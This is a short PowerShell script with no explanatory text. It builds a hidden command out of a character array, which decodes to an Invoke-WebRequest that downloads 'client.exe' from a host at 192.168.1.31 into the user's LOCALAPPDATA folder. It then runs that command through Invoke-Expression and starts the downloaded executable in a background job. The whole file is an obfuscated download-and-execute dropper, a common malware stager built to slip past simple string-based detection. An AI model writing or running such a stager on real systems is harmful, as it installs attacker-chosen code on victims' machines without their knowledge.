$targetDirectory = $env:LOCALAPPDATA
$executableName = "client.exe"
$outputPath = Join-Path -Path $targetDirectory -ChildPath $executableName

$WRARR = 'I', 'n', 'v', 'o', 'k', 'e', '-', 'W', 'e', 'b', 'R', 'e', 'q', 'u', 'e', 's', 't', ' ', '-', 'U', 'r', 'i', ' ', '"', 'h', 't', 't', 'p', ':', '/', '/', '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '3', '1', '/', '$', 'e', 'x', 'e', 'c', 'u', 't', 'a', 'b', 'l', 'e', 'N', 'a', 'm', 'e', '"', ' ', '-', 'O', 'u', 't', 'F', 'i', 'l', 'e', ' ', '$', 'o', 'u', 't', 'p', 'u', 't', 'P', 'a', 't', 'h', ' ', '-', 'E', 'r', 'r', 'o', 'r', 'A', 'c', 't', 'i', 'o', 'n', ' ', 'S', 't', 'o', 'p'

$WR = -join $WRARR



Invoke-Expression $WR

Start-Job -ScriptBlock { & "$($using:outputPath)" }